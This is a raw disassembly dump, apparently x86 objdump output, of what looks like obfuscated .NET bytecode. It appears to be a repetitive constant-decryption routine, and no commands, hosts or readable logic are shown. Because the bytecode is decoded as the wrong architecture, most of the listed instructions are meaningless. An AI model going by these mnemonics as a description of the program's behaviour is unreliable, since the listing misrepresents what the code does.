  40379c:	20 03                	and    %al,(%ebx)
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	00 7f 0d             	add    %bh,0xd(%edi)
  4037a3:	00 00                	add    %al,(%eax)
  4037a5:	04 d3                	add    $0xd3,%al
  4037a7:	20 03                	and    %al,(%ebx)
  4037a9:	00 00                	add    %al,(%eax)
  4037ab:	00 58 47             	add    %bl,0x47(%eax)
  4037ae:	69 20 b8 00 00 00    	imul   $0xb8,(%eax),%esp
  4037b4:	61                   	popa
  4037b5:	9d                   	popf
  4037b6:	fe 09                	decb   (%ecx)
  4037b8:	05 00 71 03 00       	add    $0x37100,%eax
  4037bd:	00 01                	add    %al,(%ecx)
  4037bf:	20 04 00             	and    %al,(%eax,%eax,1)
  4037c2:	00 00                	add    %al,(%eax)
  4037c4:	7f 0d                	jg     0x4037d3
  4037c6:	00 00                	add    %al,(%eax)
  4037c8:	04 d3                	add    $0xd3,%al
  4037ca:	20 04 00             	and    %al,(%eax,%eax,1)
  4037cd:	00 00                	add    %al,(%eax)
  4037cf:	58                   	pop    %eax
  4037d0:	47                   	inc    %edi
  4037d1:	69 20 68 00 00 00    	imul   $0x68,(%eax),%esp
  4037d7:	61                   	popa
  4037d8:	9d                   	popf
  4037d9:	fe 09                	decb   (%ecx)
  4037db:	05 00 71 03 00       	add    $0x37100,%eax
  4037e0:	00 01                	add    %al,(%ecx)
  4037e2:	20 05 00 00 00 7f    	and    %al,0x7f000000
  4037e8:	0d 00 00 04 d3       	or     $0xd3040000,%eax
  4037ed:	20 05 00 00 00 58    	and    %al,0x58000000
  4037f3:	47                   	inc    %edi
  4037f4:	69 20 b2 00 00 00    	imul   $0xb2,(%eax),%esp
  4037fa:	61                   	popa
  4037fb:	9d                   	popf
  4037fc:	fe 09                	decb   (%ecx)
  4037fe:	05 00 71 03 00       	add    $0x37100,%eax
  403803:	00 01                	add    %al,(%ecx)
  403805:	20 06                	and    %al,(%esi)
  403807:	00 00                	add    %al,(%eax)
  403809:	00 7f 0d             	add    %bh,0xd(%edi)
  40380c:	00 00                	add    %al,(%eax)
  40380e:	04 d3                	add    $0xd3,%al
  403810:	20 06                	and    %al,(%esi)
  403812:	00 00                	add    %al,(%eax)
  403814:	00 58 47             	add    %bl,0x47(%eax)
  403817:	69 20 52 00 00 00    	imul   $0x52,(%eax),%esp
  40381d:	61                   	popa
  40381e:	9d                   	popf
  40381f:	fe 09                	decb   (%ecx)
  403821:	05 00 71 03 00       	add    $0x37100,%eax
  403826:	00 01                	add    %al,(%ecx)
  403828:	20 07                	and    %al,(%edi)
  40382a:	00 00                	add    %al,(%eax)
  40382c:	00 20                	add    %ah,(%eax)
  40382e:	3e 00 00             	add    %al,%ds:(%eax)
  403831:	00 20                	add    %ah,(%eax)
  403833:	5b                   	pop    %ebx
  403834:	00 00                	add    %al,(%eax)
  403836:	00 61 9d             	add    %ah,-0x63(%ecx)
  403839:	fe 09                	decb   (%ecx)
  40383b:	05 00 71 03 00       	add    $0x37100,%eax
  403840:	00 01                	add    %al,(%ecx)
  403842:	20 08                	and    %cl,(%eax)
  403844:	00 00                	add    %al,(%eax)
  403846:	00 7f 0d             	add    %bh,0xd(%edi)
  403849:	00 00                	add    %al,(%eax)
  40384b:	04 d3                	add    $0xd3,%al
  40384d:	20 08                	and    %cl,(%eax)
  40384f:	00 00                	add    %al,(%eax)
  403851:	00 58 47             	add    %bl,0x47(%eax)
  403854:	69 20 9e 00 00 00    	imul   $0x9e,(%eax),%esp
  40385a:	61                   	popa
  40385b:	9d                   	popf
  40385c:	fe 09                	decb   (%ecx)
  40385e:	05 00 71 03 00       	add    $0x37100,%eax
  403863:	00 01                	add    %al,(%ecx)
  403865:	20 09                	and    %cl,(%ecx)
  403867:	00 00                	add    %al,(%eax)
  403869:	00 7f 0d             	add    %bh,0xd(%edi)
  40386c:	00 00                	add    %al,(%eax)
  40386e:	04 d3                	add    $0xd3,%al
  403870:	20 09                	and    %cl,(%ecx)
  403872:	00 00                	add    %al,(%eax)
  403874:	00 58 47             	add    %bl,0x47(%eax)
  403877:	69 20 5a 00 00 00    	imul   $0x5a,(%eax),%esp
  40387d:	61                   	popa
  40387e:	9d                   	popf
  40387f:	fe 09                	decb   (%ecx)
  403881:	05 00 71 03 00       	add    $0x37100,%eax
  403886:	00 01                	add    %al,(%ecx)
  403888:	20 0a                	and    %cl,(%edx)
  40388a:	00 00                	add    %al,(%eax)
  40388c:	00 20                	add    %ah,(%eax)
  40388e:	a1 00 00 00 20       	mov    0x20000000,%eax
  403893:	c2 00 00             	ret    $0x0
  403896:	00 61 9d             	add    %ah,-0x63(%ecx)
  403899:	fe 09                	decb   (%ecx)
  40389b:	05 00 71 03 00       	add    $0x37100,%eax
  4038a0:	00 01                	add    %al,(%ecx)
  4038a2:	20 0b                	and    %cl,(%ebx)
  4038a4:	00 00                	add    %al,(%eax)
  4038a6:	00 7f 0d             	add    %bh,0xd(%edi)
  4038a9:	00 00                	add    %al,(%eax)
  4038ab:	04 d3                	add    $0xd3,%al
  4038ad:	20 0b                	and    %cl,(%ebx)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	00 58 47             	add    %bl,0x47(%eax)
  4038b4:	69 20 52 00 00 00    	imul   $0x52,(%eax),%esp
  4038ba:	61                   	popa
  4038bb:	9d                   	popf
  4038bc:	fe 09                	decb   (%ecx)
  4038be:	05 00 71 03 00       	add    $0x37100,%eax
  4038c3:	00 01                	add    %al,(%ecx)
  4038c5:	20 0c 00             	and    %cl,(%eax,%eax,1)
  4038c8:	00 00                	add    %al,(%eax)
  4038ca:	7f 0d                	jg     0x4038d9
  4038cc:	00 00                	add    %al,(%eax)
  4038ce:	04 d3                	add    $0xd3,%al
  4038d0:	20 0c 00             	and    %cl,(%eax,%eax,1)
  4038d3:	00 00                	add    %al,(%eax)
  4038d5:	58                   	pop    %eax
  4038d6:	47                   	inc    %edi
  4038d7:	69 20 87 00 00 00    	imul   $0x87,(%eax),%esp
  4038dd:	61                   	popa
  4038de:	9d                   	popf
  4038df:	fe 09                	decb   (%ecx)
  4038e1:	05 00 71 03 00       	add    $0x37100,%eax
  4038e6:	00 01                	add    %al,(%ecx)
  4038e8:	20 0d 00 00 00 20    	and    %cl,0x20000000
  4038ee:	c4 00                	les    (%eax),%eax
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	20 a5 00 00 00 61    	and    %ah,0x61000000(%ebp)
  4038f8:	9d                   	popf
  4038f9:	fe 09                	decb   (%ecx)
  4038fb:	05 00 71 03 00       	add    $0x37100,%eax
  403900:	00 01                	add    %al,(%ecx)
  403902:	20 0e                	and    %cl,(%esi)
  403904:	00 00                	add    %al,(%eax)
  403906:	00 20                	add    %ah,(%eax)
  403908:	06                   	push   %es
  403909:	00 00                	add    %al,(%eax)
  40390b:	00 20                	add    %ah,(%eax)
  40390d:	64 00 00             	add    %al,%fs:(%eax)
  403910:	00 61 9d             	add    %ah,-0x63(%ecx)
  403913:	fe 09                	decb   (%ecx)
  403915:	05 00 71 03 00       	add    $0x37100,%eax
  40391a:	00 01                	add    %al,(%ecx)
  40391c:	20 0f                	and    %cl,(%edi)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 20                	add    %ah,(%eax)
  403922:	05 00 00 00 20       	add    $0x20000000,%eax
  403927:	69 00 00 00 61 9d    	imul   $0x9d610000,(%eax),%eax
  40392d:	fe 09                	decb   (%ecx)
  40392f:	05 00 71 03 00       	add    $0x37100,%eax
  403934:	00 01                	add    %al,(%ecx)
  403936:	20 10                	and    %dl,(%eax)
  403938:	00 00                	add    %al,(%eax)
  40393a:	00 20                	add    %ah,(%eax)
  40393c:	27                   	daa
  40393d:	00 00                	add    %al,(%eax)
  40393f:	00 20                	add    %ah,(%eax)
  403941:	42                   	inc    %edx
  403942:	00 00                	add    %al,(%eax)
  403944:	00 61 9d             	add    %ah,-0x63(%ecx)
  403947:	fe 09                	decb   (%ecx)
  403949:	05 00 71 03 00       	add    $0x37100,%eax
  40394e:	00 01                	add    %al,(%ecx)
  403950:	20 11                	and    %dl,(%ecx)
  403952:	00 00                	add    %al,(%eax)
  403954:	00 7f 0d             	add    %bh,0xd(%edi)
  403957:	00 00                	add    %al,(%eax)
  403959:	04 d3                	add    $0xd3,%al
  40395b:	20 11                	and    %dl,(%ecx)
  40395d:	00 00                	add    %al,(%eax)
  40395f:	00 58 47             	add    %bl,0x47(%eax)
  403962:	69 20 8c 00 00 00    	imul   $0x8c,(%eax),%esp
  403968:	61                   	popa
  403969:	9d                   	popf
  40396a:	fe 09                	decb   (%ecx)
  40396c:	05 00 71 03 00       	add    $0x37100,%eax
  403971:	00 01                	add    %al,(%ecx)
  403973:	20 12                	and    %dl,(%edx)
  403975:	00 00                	add    %al,(%eax)
  403977:	00 7f 0d             	add    %bh,0xd(%edi)
  40397a:	00 00                	add    %al,(%eax)
  40397c:	04 d3                	add    $0xd3,%al
  40397e:	20 12                	and    %dl,(%edx)
  403980:	00 00                	add    %al,(%eax)
  403982:	00 58 47             	add    %bl,0x47(%eax)
  403985:	69 20 67 00 00 00    	imul   $0x67,(%eax),%esp
  40398b:	61                   	popa
  40398c:	9d                   	popf
  40398d:	fe 09                	decb   (%ecx)
  40398f:	05 00 71 03 00       	add    $0x37100,%eax
  403994:	00 01                	add    %al,(%ecx)
  403996:	20 13                	and    %dl,(%ebx)
  403998:	00 00                	add    %al,(%eax)
  40399a:	00 7f 0d             	add    %bh,0xd(%edi)
  40399d:	00 00                	add    %al,(%eax)
  40399f:	04 d3                	add    $0xd3,%al
  4039a1:	20 13                	and    %dl,(%ebx)
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	00 58 47             	add    %bl,0x47(%eax)
  4039a8:	69 20 d6 00 00 00    	imul   $0xd6,(%eax),%esp
  4039ae:	61                   	popa
  4039af:	9d                   	popf
  4039b0:	fe 09                	decb   (%ecx)
  4039b2:	05 00 71 03 00       	add    $0x37100,%eax
  4039b7:	00 01                	add    %al,(%ecx)
  4039b9:	20 14 00             	and    %dl,(%eax,%eax,1)
  4039bc:	00 00                	add    %al,(%eax)
  4039be:	20 90 00 00 00 20    	and    %dl,0x20000000(%eax)
  4039c4:	e4 00                	in     $0x0,%al
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	61                   	popa
  4039c9:	9d                   	popf
  4039ca:	fe 09                	decb   (%ecx)
  4039cc:	05 00 71 03 00       	add    $0x37100,%eax
  4039d1:	00 01                	add    %al,(%ecx)
  4039d3:	20 15 00 00 00 7f    	and    %dl,0x7f000000
  4039d9:	0d 00 00 04 d3       	or     $0xd3040000,%eax
  4039de:	20 15 00 00 00 58    	and    %dl,0x58000000
  4039e4:	47                   	inc    %edi
  4039e5:	69 20 bb 00 00 00    	imul   $0xbb,(%eax),%esp
  4039eb:	61                   	popa
  4039ec:	9d                   	popf
  4039ed:	fe 09                	decb   (%ecx)
  4039ef:	05 00 71 03 00       	add    $0x37100,%eax
  4039f4:	00 01                	add    %al,(%ecx)
  4039f6:	20 16                	and    %dl,(%esi)
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	00 20                	add    %ah,(%eax)
  4039fc:	05 00 00 00 20       	add    $0x20000000,%eax
  403a01:	63 00                	arpl   %eax,(%eax)
  403a03:	00 00                	add    %al,(%eax)
  403a05:	61                   	popa
  403a06:	9d                   	popf
  403a07:	fe 09                	decb   (%ecx)
  403a09:	05 00 71 03 00       	add    $0x37100,%eax
  403a0e:	00 01                	add    %al,(%ecx)
  403a10:	20 17                	and    %dl,(%edi)
  403a12:	00 00                	add    %al,(%eax)
  403a14:	00 7f 0d             	add    %bh,0xd(%edi)
  403a17:	00 00                	add    %al,(%eax)
  403a19:	04 d3                	add    $0xd3,%al
  403a1b:	20 17                	and    %dl,(%edi)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 58 47             	add    %bl,0x47(%eax)
  403a22:	69 20 8e 00 00 00    	imul   $0x8e,(%eax),%esp
  403a28:	61                   	popa
  403a29:	9d                   	popf
  403a2a:	fe 09                	decb   (%ecx)
  403a2c:	05 00 71 03 00       	add    $0x37100,%eax
  403a31:	00 01                	add    %al,(%ecx)
  403a33:	20 18                	and    %bl,(%eax)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	00 7f 0d             	add    %bh,0xd(%edi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	04 d3                	add    $0xd3,%al
  403a3e:	20 18                	and    %bl,(%eax)
  403a40:	00 00                	add    %al,(%eax)
  403a42:	00 58 47             	add    %bl,0x47(%eax)
  403a45:	69 20 da 00 00 00    	imul   $0xda,(%eax),%esp
  403a4b:	61                   	popa
  403a4c:	9d                   	popf
  403a4d:	fe 09                	decb   (%ecx)
  403a4f:	05 00 71 03 00       	add    $0x37100,%eax
  403a54:	00 01                	add    %al,(%ecx)
  403a56:	20 19                	and    %bl,(%ecx)
  403a58:	00 00                	add    %al,(%eax)
  403a5a:	00 7f 0d             	add    %bh,0xd(%edi)
  403a5d:	00 00                	add    %al,(%eax)
  403a5f:	04 d3                	add    $0xd3,%al
  403a61:	20 19                	and    %bl,(%ecx)
  403a63:	00 00                	add    %al,(%eax)
  403a65:	00 58 47             	add    %bl,0x47(%eax)
  403a68:	69 20 2d 00 00 00    	imul   $0x2d,(%eax),%esp
  403a6e:	61                   	popa
  403a6f:	9d                   	popf
  403a70:	fe 09                	decb   (%ecx)
  403a72:	05 00 71 03 00       	add    $0x37100,%eax
  403a77:	00 01                	add    %al,(%ecx)
  403a79:	20 1a                	and    %bl,(%edx)
  403a7b:	00 00                	add    %al,(%eax)
  403a7d:	00 7f 0d             	add    %bh,0xd(%edi)
  403a80:	00 00                	add    %al,(%eax)
  403a82:	04 d3                	add    $0xd3,%al
  403a84:	20 1a                	and    %bl,(%edx)
  403a86:	00 00                	add    %al,(%eax)
  403a88:	00 58 47             	add    %bl,0x47(%eax)
  403a8b:	69 20 28 00 00 00    	imul   $0x28,(%eax),%esp
  403a91:	61                   	popa
  403a92:	9d                   	popf
  403a93:	fe 09                	decb   (%ecx)
  403a95:	05 00 71 03 00       	add    $0x37100,%eax
  403a9a:	00 01                	add    %al,(%ecx)
  403a9c:	20 1b                	and    %bl,(%ebx)
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	00 20                	add    %ah,(%eax)
  403aa2:	0d 00 00 00 20       	or     $0x20000000,%eax
  403aa7:	2d 00 00 00 61       	sub    $0x61000000,%eax
  403aac:	9d                   	popf
  403aad:	fe 09                	decb   (%ecx)
  403aaf:	05 00 71 03 00       	add    $0x37100,%eax
  403ab4:	00 01                	add    %al,(%ecx)
  403ab6:	20 1c 00             	and    %bl,(%eax,%eax,1)
  403ab9:	00 00                	add    %al,(%eax)
  403abb:	20 da                	and    %bl,%dl
  403abd:	00 00                	add    %al,(%eax)
  403abf:	00 20                	add    %ah,(%eax)
  403ac1:	bb 00 00 00 61       	mov    $0x61000000,%ebx
  403ac6:	9d                   	popf
  403ac7:	fe 09                	decb   (%ecx)
  403ac9:	05 00 71 03 00       	add    $0x37100,%eax
  403ace:	00 01                	add    %al,(%ecx)
  403ad0:	20 1d 00 00 00 7f    	and    %bl,0x7f000000
  403ad6:	0d 00 00 04 d3       	or     $0xd3040000,%eax
  403adb:	20 1d 00 00 00 58    	and    %bl,0x58000000
  403ae1:	47                   	inc    %edi
  403ae2:	69 20 9b 00 00 00    	imul   $0x9b,(%eax),%esp
  403ae8:	61                   	popa
  403ae9:	9d                   	popf
  403aea:	fe 09                	decb   (%ecx)
  403aec:	05 00 71 03 00       	add    $0x37100,%eax
  403af1:	00 01                	add    %al,(%ecx)
  403af3:	20 1e                	and    %bl,(%esi)
  403af5:	00 00                	add    %al,(%eax)
  403af7:	00 7f 0d             	add    %bh,0xd(%edi)
  403afa:	00 00                	add    %al,(%eax)
  403afc:	04 d3                	add    $0xd3,%al
  403afe:	20 1e                	and    %bl,(%esi)
  403b00:	00 00                	add    %al,(%eax)
  403b02:	00 58 47             	add    %bl,0x47(%eax)
  403b05:	69 20 54 00 00 00    	imul   $0x54,(%eax),%esp
  403b0b:	61                   	popa
  403b0c:	9d                   	popf
  403b0d:	fe 09                	decb   (%ecx)
  403b0f:	05 00 71 03 00       	add    $0x37100,%eax
  403b14:	00 01                	add    %al,(%ecx)
  403b16:	20 1f                	and    %bl,(%edi)
  403b18:	00 00                	add    %al,(%eax)
  403b1a:	00 20                	add    %ah,(%eax)
  403b1c:	91                   	xchg   %eax,%ecx
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	00 20                	add    %ah,(%eax)
  403b21:	b1 00                	mov    $0x0,%cl
  403b23:	00 00                	add    %al,(%eax)
  403b25:	61                   	popa
  403b26:	9d                   	popf
  403b27:	73 03                	jae    0x403b2c
  403b29:	00 00                	add    %al,(%eax)
  403b2b:	0a fe                	or     %dh,%bh
  403b2d:	09 0a                	or     %ecx,(%edx)
  403b2f:	00 28                	add    %ch,(%eax)
  403b31:	0b 00                	or     (%eax),%eax
  403b33:	00 0a                	add    %cl,(%edx)
  403b35:	73 0c                	jae    0x403b43
  403b37:	00 00                	add    %al,(%eax)
  403b39:	0a 7a 00             	or     0x0(%edx),%bh
  403b3c:	13 30                	adc    (%eax),%esi
  403b3e:	02 00                	add    (%eax),%al
  403b40:	39 00                	cmp    %eax,(%eax)
  403b42:	00 00                	add    %al,(%eax)
  403b44:	0d 00 00 11 fe       	or     $0xfe110000,%eax
  403b49:	09 09                	or     %ecx,(%ecx)
  403b4b:	00 71 0e             	add    %dh,0xe(%ecx)
  403b4e:	00 00                	add    %al,(%eax)
  403b50:	01 39                	add    %edi,(%ecx)
  403b52:	0a 00                	or     (%eax),%al
  403b54:	00 00                	add    %al,(%eax)
  403b56:	20 00                	and    %al,(%eax)
  403b58:	00 00                	add    %al,(%eax)
  403b5a:	00 38                	add    %bh,(%eax)
  403b5c:	06                   	push   %es
  403b5d:	00 00                	add    %al,(%eax)
  403b5f:	00 00                	add    %al,(%eax)
  403b61:	20 01                	and    %al,(%ecx)
  403b63:	00 00                	add    %al,(%eax)
  403b65:	00 00                	add    %al,(%eax)
  403b67:	20 01                	and    %al,(%ecx)
  403b69:	00 00                	add    %al,(%eax)
  403b6b:	00 5a 20             	add    %bl,0x20(%edx)
  403b6e:	0c 00                	or     $0x0,%al
  403b70:	00 00                	add    %al,(%eax)
  403b72:	58                   	pop    %eax
  403b73:	fe 0e                	decb   (%esi)
  403b75:	00 00                	add    %al,(%eax)
  403b77:	fe 09                	decb   (%ecx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	fe 0c 00             	decb   (%eax,%eax,1)
  403b7e:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  403b82:	00 00                	add    %al,(%eax)
  403b84:	1b 30                	sbb    (%eax),%esi
  403b86:	0f 00 4b 0c          	str    0xc(%ebx)
  403b8a:	00 00                	add    %al,(%eax)
  403b8c:	0e                   	push   %cs
  403b8d:	00 00                	add    %al,(%eax)
  403b8f:	11 17                	adc    %edx,(%edi)
  403b91:	8d 11                	lea    (%ecx),%edx
  403b93:	00 00                	add    %al,(%eax)
  403b95:	01 0a                	add    %ecx,(%edx)
  403b97:	17                   	pop    %ss
  403b98:	8d 12                	lea    (%edx),%edx
  403b9a:	00 00                	add    %al,(%eax)
  403b9c:	01 0b                	add    %ecx,(%ebx)
  403b9e:	06                   	push   %es
  403b9f:	16                   	push   %ss
  403ba0:	d0 03                	rolb   $1,(%ebx)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	01 a4 11 00 00 01 7f 	add    %esp,0x7f010000(%ecx,%edx,1)
  403bab:	12 00                	adc    (%eax),%al
  403bad:	00 04 0c             	add    %al,(%esp,%ecx,1)
  403bb0:	12 03                	adc    (%ebx),%al
  403bb2:	25 17 54 46 1a       	and    $0x1a465417,%eax
  403bb7:	5a                   	pop    %edx
  403bb8:	13 04 1a             	adc    (%edx,%ebx,1),%eax
  403bbb:	13 05 1a 13 06 1a    	adc    0x1a06131a,%eax
  403bc1:	13 06                	adc    (%esi),%eax
  403bc3:	00 11                	add    %dl,(%ecx)
  403bc5:	06                   	push   %es
  403bc6:	16                   	push   %ss
  403bc7:	33 08                	xor    (%eax),%ecx
  403bc9:	1a 13                	sbb    (%ebx),%dl
  403bcb:	06                   	push   %es
  403bcc:	dd 08                	fisttpll (%eax)
  403bce:	0c 00                	or     $0x0,%al
  403bd0:	00 00                	add    %al,(%eax)
  403bd2:	11 06                	adc    %eax,(%esi)
  403bd4:	18 40 33             	sbb    %al,0x33(%eax)
  403bd7:	01 00                	add    %eax,(%eax)
  403bd9:	00 1a                	add    %bl,(%edx)
  403bdb:	13 06                	adc    (%esi),%eax
  403bdd:	11 07                	adc    %eax,(%edi)
  403bdf:	17                   	pop    %ss
  403be0:	9a a5 04 00 00 01 16 	lcall  $0x1601,$0x4a5
  403be7:	3b 00                	cmp    (%eax),%eax
  403be9:	01 00                	add    %eax,(%eax)
  403beb:	00 11                	add    %dl,(%ecx)
  403bed:	07                   	pop    %es
  403bee:	16                   	push   %ss
  403bef:	9a a5 04 00 00 01 13 	lcall  $0x1301,$0x4a5
  403bf6:	08 08                	or     %cl,(%eax)
  403bf8:	11 08                	adc    %ecx,(%eax)
  403bfa:	58                   	pop    %eax
  403bfb:	1e                   	push   %ds
  403bfc:	58                   	pop    %eax
  403bfd:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403c00:	4a                   	dec    %edx
  403c01:	13 09                	adc    (%ecx),%ecx
  403c03:	08 08                	or     %cl,(%eax)
  403c05:	11 07                	adc    %eax,(%edi)
  403c07:	1c 9a                	sbb    $0x9a,%al
  403c09:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403c0a:	04 00                	add    $0x0,%al
  403c0c:	00 01                	add    %al,(%ecx)
  403c0e:	58                   	pop    %eax
  403c0f:	1e                   	push   %ds
  403c10:	58                   	pop    %eax
  403c11:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403c14:	4a                   	dec    %edx
  403c15:	58                   	pop    %eax
  403c16:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403c19:	4a                   	dec    %edx
  403c1a:	13 0a                	adc    (%edx),%ecx
  403c1c:	00 11                	add    %dl,(%ecx)
  403c1e:	0a 11                	or     (%ecx),%dl
  403c20:	09 33                	or     %esi,(%ebx)
  403c22:	70 11                	jo     0x403c35
  403c24:	07                   	pop    %es
  403c25:	1a 9a 74 08 00 00    	sbb    0x874(%edx),%bl
  403c2b:	01 13                	add    %edx,(%ebx)
  403c2d:	0b 08                	or     (%eax),%ecx
  403c2f:	11 08                	adc    %ecx,(%eax)
  403c31:	58                   	pop    %eax
  403c32:	1f                   	pop    %ds
  403c33:	20 58 11             	and    %bl,0x11(%eax)
  403c36:	04 58                	add    $0x58,%al
  403c38:	4a                   	dec    %edx
  403c39:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403c3c:	0b 13                	or     (%ebx),%edx
  403c3e:	0d 11 07 18 9a       	or     $0x9a180711,%eax
  403c43:	74 01                	je     0x403c46
  403c45:	00 00                	add    %al,(%eax)
  403c47:	1b 13                	sbb    (%ebx),%edx
  403c49:	07                   	pop    %es
  403c4a:	1e                   	push   %ds
  403c4b:	8d 03                	lea    (%ebx),%eax
  403c4d:	00 00                	add    %al,(%eax)
  403c4f:	01 13                	add    %edx,(%ebx)
  403c51:	0e                   	push   %cs
  403c52:	11 0e                	adc    %ecx,(%esi)
  403c54:	17                   	pop    %ss
  403c55:	17                   	pop    %ss
  403c56:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403c59:	00 01                	add    %al,(%ecx)
  403c5b:	a2 11 0e 18 11       	mov    %al,0x11180e11
  403c60:	07                   	pop    %es
  403c61:	a2 11 0e 1a 11       	mov    %al,0x111a0e11
  403c66:	0b a2 11 0e 1c 11    	or     0x111c0e11(%edx),%esp
  403c6c:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  403c73:	11 0e                	adc    %ecx,(%esi)
  403c75:	19 18                	sbb    %ebx,(%eax)
  403c77:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403c7a:	00 01                	add    %al,(%ecx)
  403c7c:	a2 11 0e 13 07       	mov    %al,0x7130e11
  403c81:	08 11                	or     %dl,(%ecx)
  403c83:	08 58 1f             	or     %bl,0x1f(%eax)
  403c86:	20 58 11             	and    %bl,0x11(%eax)
  403c89:	04 58                	add    $0x58,%al
  403c8b:	4a                   	dec    %edx
  403c8c:	13 05 38 30 ff ff    	adc    0xffff3038,%eax
  403c92:	ff 00                	incl   (%eax)
  403c94:	08 11                	or     %dl,(%ecx)
  403c96:	0a 58 1f             	or     0x1f(%eax),%bl
  403c99:	28 58 11             	sub    %bl,0x11(%eax)
  403c9c:	04 58                	add    $0x58,%al
  403c9e:	4a                   	dec    %edx
  403c9f:	13 0f                	adc    (%edi),%ecx
  403ca1:	11 0f                	adc    %ecx,(%edi)
  403ca3:	15 2e 34 08 11       	adc    $0x1108342e,%eax
  403ca8:	0f 58 1f             	addps  (%edi),%xmm3
  403cab:	20 58 11             	and    %bl,0x11(%eax)
  403cae:	04 58                	add    $0x58,%al
  403cb0:	4a                   	dec    %edx
  403cb1:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403cb4:	07                   	pop    %es
  403cb5:	1c 11                	sbb    $0x11,%al
  403cb7:	0f 8c 04 00 00 01    	jl     0x1403cc1
  403cbd:	a2 11 07 19 16       	mov    %al,0x16190711
  403cc2:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403cc5:	00 01                	add    %al,(%ecx)
  403cc7:	a2 08 11 0f 58       	mov    %al,0x580f1108
  403ccc:	1f                   	pop    %ds
  403ccd:	20 58 11             	and    %bl,0x11(%eax)
  403cd0:	04 58                	add    $0x58,%al
  403cd2:	4a                   	dec    %edx
  403cd3:	13 05 38 e9 fe ff    	adc    0xfffee938,%eax
  403cd9:	ff 00                	incl   (%eax)
  403cdb:	08 11                	or     %dl,(%ecx)
  403cdd:	0a 58 11             	or     0x11(%eax),%bl
  403ce0:	04 58                	add    $0x58,%al
  403ce2:	4a                   	dec    %edx
  403ce3:	13 0a                	adc    (%edx),%ecx
  403ce5:	38 32                	cmp    %dh,(%edx)
  403ce7:	ff                   	(bad)
  403ce8:	ff                   	(bad)
  403ce9:	ff 2b                	ljmp   *(%ebx)
  403ceb:	20 00                	and    %al,(%eax)
  403ced:	11 07                	adc    %eax,(%edi)
  403cef:	1b 9a a5 04 00 00    	sbb    0x4a5(%edx),%ebx
  403cf5:	01 13                	add    %edx,(%ebx)
  403cf7:	10 11                	adc    %dl,(%ecx)
  403cf9:	07                   	pop    %es
  403cfa:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  403d00:	1b 13                	sbb    (%ebx),%edx
  403d02:	07                   	pop    %es
  403d03:	11 10                	adc    %edx,(%eax)
  403d05:	13 11                	adc    (%ecx),%edx
  403d07:	38 0f                	cmp    %cl,(%edi)
  403d09:	07                   	pop    %es
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	00 00                	add    %al,(%eax)
  403d0e:	11 06                	adc    %eax,(%esi)
  403d10:	1f                   	pop    %ds
  403d11:	12 33                	adc    (%ebx),%dh
  403d13:	10 1a                	adc    %bl,(%edx)
  403d15:	13 06                	adc    (%esi),%eax
  403d17:	11 12                	adc    %edx,(%edx)
  403d19:	13 0f                	adc    (%edi),%ecx
  403d1b:	11 0f                	adc    %ecx,(%edi)
  403d1d:	13 11                	adc    (%ecx),%edx
  403d1f:	38 f7                	cmp    %dh,%bh
  403d21:	06                   	push   %es
  403d22:	00 00                	add    %al,(%eax)
  403d24:	00 12                	add    %dl,(%edx)
  403d26:	05 12 06 12 12       	add    $0x12120612,%eax
  403d2b:	11 0d 12 13 12 14    	adc    %ecx,0x14121312
  403d31:	12 15 12 16 12 17    	adc    0x17121612,%dl
  403d37:	12 18                	adc    (%eax),%bl
  403d39:	02 03                	add    (%ebx),%al
  403d3b:	04 7e                	add    $0x7e,%al
  403d3d:	04 00                	add    $0x0,%al
  403d3f:	00 04 11             	add    %al,(%ecx,%edx,1)
  403d42:	05 97 29 0f 00       	add    $0xf2997,%eax
  403d47:	00 11                	add    %dl,(%ecx)
  403d49:	38 75 fe             	cmp    %dh,-0x2(%ebp)
  403d4c:	ff                   	(bad)
  403d4d:	ff 00                	incl   (%eax)
  403d4f:	11 07                	adc    %eax,(%edi)
  403d51:	13 0e                	adc    (%esi),%ecx
  403d53:	08 11                	or     %dl,(%ecx)
  403d55:	0e                   	push   %cs
  403d56:	1c 9a                	sbb    $0x9a,%al
  403d58:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d59:	04 00                	add    $0x0,%al
  403d5b:	00 01                	add    %al,(%ecx)
  403d5d:	58                   	pop    %eax
  403d5e:	1f                   	pop    %ds
  403d5f:	40                   	inc    %eax
  403d60:	58                   	pop    %eax
  403d61:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403d64:	4a                   	dec    %edx
  403d65:	13 09                	adc    (%ecx),%ecx
  403d67:	00 11                	add    %dl,(%ecx)
  403d69:	09 15 33 05 38 32    	or     %edx,0x32380533
  403d6f:	02 00                	add    (%eax),%al
  403d71:	00 00                	add    %al,(%eax)
  403d73:	08 11                	or     %dl,(%ecx)
  403d75:	09 58 1f             	or     %ebx,0x1f(%eax)
  403d78:	10 58 11             	adc    %bl,0x11(%eax)
  403d7b:	04 58                	add    $0x58,%al
  403d7d:	4a                   	dec    %edx
  403d7e:	13 0a                	adc    (%edx),%ecx
  403d80:	16                   	push   %ss
  403d81:	11 0a                	adc    %ecx,(%edx)
